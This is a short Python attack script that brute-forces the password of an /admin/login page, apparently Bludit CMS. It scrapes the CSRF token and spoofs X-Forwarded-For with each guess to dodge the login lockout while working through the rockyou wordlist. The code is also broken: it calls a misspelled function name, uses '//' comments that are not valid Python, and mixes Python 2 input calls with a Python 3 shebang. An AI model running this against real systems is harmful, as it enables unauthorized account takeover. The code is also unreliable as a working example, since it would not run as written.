#!/usr/bin/env python3

import re
import requests
#from __future__ import print_function

def open_ressources(file_path):
  return [item.replace("\n", "") for item in open(file_path).readlines()]
  
host = raw_input("Enter host to bruteforce: ")
login_url = 'http://' + host + '/admin/login'     //CHANGE THIS IF NECESARY
username = raw_input("Enter the user name: ")
wordlist = open_resources("/usr/share/wordlists/rockyou.txt")   //CHANGE THIS IF YOU WANT

for password in wordlist:
  session = requests.Session()
  login_page = session.get(login_url)
  csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
  
  print('[*] Trying: {p}'.format(p = password))
  
  headers = {
    'X-Forwarded-For': password,
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
    'Referer': login_url
  }
  
  data = {
    'tokenCSRF': csrf_token,
    'username': username,
    'password': password,
    'save': ''
  }
  
  login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
  
  if 'location' in login_result.headers:
    if '/admin/dashboard' in login_result.headers['location']:
      print('SUCCESS: Password found!')
      print('Username and Password----> {u}:{p}.'.format (u = username, p = password))
      break
else:
  print('Password not found in the Wordlist')



